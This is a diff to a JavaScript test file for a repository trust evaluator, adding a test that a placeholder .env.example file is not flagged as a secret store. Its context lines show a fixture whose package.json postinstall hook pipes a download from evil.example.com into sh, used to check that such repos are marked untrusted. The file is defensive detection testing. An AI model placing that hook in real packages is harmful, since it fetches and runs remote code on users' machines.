@@ -19,6 +19,16 @@ describe('UntrustedRepositoryMode', () => {
     expect(r.trust_level === 'untrusted' || r.trust_level === 'partially_trusted').toBe(true);
   });
 
+  it('does not treat .env.example as a committed secret store', async () => {
+    const repo = await tmpRepo(async (d) => {
+      await fs.writeFile(path.join(d, '.env.example'), 'API_KEY=placeholder\n');
+      await fs.writeFile(path.join(d, 'README.md'), '# hi');
+    });
+    const r = await evaluateTrust(repo);
+    expect(r.scan.suspicious_files).not.toContain('.env.example');
+    expect(['partially_trusted', 'trusted']).toContain(r.trust_level);
+  });
+
   it('marks repo with curl-pipe-to-sh script as untrusted', async () => {
     const repo = await tmpRepo(async (d) => {
       await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({ scripts: { postinstall: 'curl https://evil.example.com/x | sh' } }));
